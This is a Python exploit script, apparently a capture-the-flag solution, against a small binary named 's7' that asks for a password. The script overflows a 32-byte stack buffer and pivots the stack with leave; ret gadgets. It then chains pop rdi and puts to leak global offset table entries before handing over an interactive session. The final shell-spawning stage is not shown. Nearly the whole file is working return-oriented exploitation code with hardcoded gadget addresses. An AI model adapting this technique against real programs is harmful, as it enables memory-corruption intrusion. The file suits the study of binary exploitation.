#!/usr/bin/env python
# -*- coding: utf-8 -*-

import binexpect
import struct

# 0x400630 : read() rbp - 0x20; stuff...; leave; ret
# 0x400687 : puts; leave; ret
# 0x400691 : leave; ret
# 0x400703 : pop rdi; ret

base = 0x601800

def leak(addr):
    global base

    payload = b'X' * 0x20                       # padding
    payload += struct.pack('L', base + 0x20)    # value for rbp

    payload += struct.pack('L', 0x400703)       # pop rdi; ret
    payload += struct.pack('L', addr)           # addr to leak
    payload += struct.pack('L', 0x400687)       # puts; leave; ret

    payload += struct.pack('L', base + 0x50)    # pivot
    payload += struct.pack('L', 0x400630)       # read; leave; ret (get control back)

    base += 0x50
    target.sendbin(payload)
    target.sendeof()

    target.tryexpect("\n(.*)\n")
    dleak = target.match.group(1).ljust(8, b'\x00')
    pleak = hex(struct.unpack('L', dleak)[0])
    return pleak

if __name__ == "__main__":

    setup = binexpect.setup('./s7')
    target = setup.target()
    target.setecho(False)

    # STAGE 1
    payload = b'A' * 0x20
    payload += struct.pack('L', base - 0x40)    # new stack frame
    payload += struct.pack('L', 0x400630)       # read
                                                # pivot through main's leave; ret
    target.tryexpect("What is your password\?\n")
    target.sendbin(payload)
    target.sendeof()
    target.tryexpect("If you're cool you'll get a shell.\n")

    payload = b'B' * 0x20
    payload += struct.pack('L', base)    # value for rbp
    payload += struct.pack('L', 0x400630)
    target.sendbin(payload)
    target.sendeof()
    target.tryexpect("If you're cool you'll get a shell.\n")
    # Stack have fully been pivoted
    
    l = leak(0x601008)                              # got addr
    print(l)

    l = leak(0x601020)                              # got addr
    print(l)

    l = leak(0x601028)                              # got addr
    print(l)

    l = leak(0x601030)                              # got addr
    print(l)
    l = leak(0x601038)                              # got addr
    print(l)
    l = leak(0x601040)                              # got addr
    print(l)

    target.interact()
    # target.pwned()
